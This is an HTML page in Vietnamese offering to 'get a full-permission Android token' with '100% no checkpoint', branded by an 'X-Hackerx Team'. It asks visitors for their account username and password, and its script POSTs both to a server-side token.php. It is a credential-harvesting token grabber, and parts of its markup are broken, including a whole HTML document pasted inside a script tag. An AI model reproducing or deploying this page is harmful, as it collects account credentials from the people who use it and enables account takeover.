<!DOCTYPE html>
<html lang="en">
<head>
  <title>Get Token Androi Full Quyền</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
 
<div class="container">
  <h2>Get Token Androi Full Quyền</h2>
  <div class="panel-group">
<div class="panel panel-primary">
      <div class="panel-heading">Không Bị Checkpoint 100%</div>
      <div class="panel-body">      
<div class="form-group">

<label for="usr"> Username: </label>
  <input type="text" class="form-control" id="tk">
</div>
<div class="form-group">
<label for="pwd"> Password: </label>
  <input type="password" class="form-control" id="mk">
</div>
<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Get Token</button>
<p>
  <br>
<div id="footer">
<script language="JavaScript1.2">
<!DOCTYPE html>
<html>
<body>

<img src="smiley.gif" alt="http://i.imgur.com/4xwpZzp.png" width="42" height="42">

</body>
</html>

var message="DESIGNED BY :- X-Hackerx Team"
var neonbasecolor=""
var neontextcolor="RED"
var flashspeed=100  //in milliseconds

///No need to edit below this line/////

var n=0
if (document.all||document.getElementById){
document.write('<font color="'+neonbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
}
else
document.write(message)

function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}

function neon(){

//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
//eval("document.all.neonlight"+m).style.color=neonbasecolor
crossref(m).style.color=neonbasecolor
}

//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor

if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",1500)
return
}
}

function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script>

  
</div>
    </div>
</div>

<script>
function Puaru_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "token.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
 
  </script>
<script type="text/javascript" src=""></script>
<audio src="http://tokens.ml/naja.mp3" autoplay="" loop="">
<p>Your browser does not support the audio element </p>
</audio>
